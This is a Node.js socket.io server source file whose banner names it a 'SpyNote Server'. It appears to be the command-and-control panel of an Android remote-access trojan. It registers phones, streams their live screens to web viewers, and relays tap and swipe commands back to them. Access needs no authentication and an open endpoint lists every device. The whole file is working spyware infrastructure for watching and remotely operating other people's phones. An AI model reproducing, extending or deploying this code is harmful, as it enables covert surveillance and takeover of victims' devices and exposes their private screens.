const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 30000,
    pingInterval: 10000,
    maxHttpBufferSize: 100 * 1024 * 1024, // 100MB frames
    transports: ['websocket']
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

// 🔥 PERFECT DEVICE ROOM MANAGEMENT
io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(deviceId);
            console.log(`📱 Device registered: ${deviceId} (${deviceInfo.model})`);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    socket.on('select-device', (data) => {
        console.log('🎯 Web selected device:', data.deviceId);
    });

    // 🔥 HIGH FPS FRAME RELAY - NO DROPS
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId) && socket.id === devices.get(deviceId).socketId) {
            // Broadcast to ALL web clients watching this device
            socket.to(deviceId).emit('screen-frame', data);
        }
    });

    // 🔥 PERFECT CONTROL RELAY
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            const deviceSocketId = devices.get(deviceId).socketId;
            io.to(deviceSocketId).emit('control', {
                action, 
                x: parseFloat(x) || 0, 
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0, 
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0, 
                endY: parseFloat(endY) || 0
            });
            console.log(`🎮 Control ${action} → ${deviceId}`);
        }
    });

    socket.on('quality-change', (data) => {
        console.log('🖼️ Quality change:', data);
        io.to(data.deviceId).emit('quality-change', data);
    });

    socket.on('disconnect', () => {
        console.log('🔌 Disconnected:', socket.id);
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false, lastSeen: Date.now() });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log(`📱 Device ${deviceId} went offline`);
                break;
            }
        }
    });
});

// Keepalive for devices
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (now - info.lastSeen > 30000) { // 30s timeout
            if (info.connected) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
            }
        }
    }
}, 10000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SpyNote Server LIVE on port ${PORT}`);
    console.log(`🌐 Web Panel: http://localhost:${PORT}`);
    console.log(`📱 Ready for Android 14+ devices!`);
});
